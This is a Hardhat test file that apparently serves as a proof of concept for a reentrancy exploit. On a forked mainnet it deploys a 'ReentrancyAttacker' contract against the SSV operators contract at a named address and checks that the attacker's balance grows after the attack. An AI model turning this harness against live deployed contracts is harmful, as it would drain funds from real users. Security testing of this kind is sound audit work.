const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("SSV Reentrancy PoC - Forked Mainnet", function () {
  let ssvContract;
  let attackerContract;
  let owner, attacker;

  beforeEach(async function () {
    [owner, attacker] = await ethers.getSigners();

    const SSV_ADDRESS = "0xDD9BC35aE942eF0cFa76930954a156B3fF30a4E1";
    const SSV_ABI = (await ethers.getContractFactory("SSVOperators")).interface;

    ssvContract = await ethers.getContractAt(SSV_ABI, SSV_ADDRESS);

    const ReentrancyAttacker = await ethers.getContractFactory("ReentrancyAttacker");
    attackerContract = await ReentrancyAttacker.connect(attacker).deploy(
      ssvContract.address,
      5,
      1
    );
    await attackerContract.deployed();
  });

  it("should simulate reentrancy attack", async function () {
    console.log("Launching reentrancy attack...");
    await attackerContract.connect(attacker).attack({
      value: ethers.utils.parseEther("0.01"),
    });

    const balance = await ethers.provider.getBalance(attackerContract.address);
    console.log("Attacker Contract Balance After Attack:", ethers.utils.formatEther(balance));
    expect(balance).to.be.gt(ethers.utils.parseEther("0.01"));
  });
});
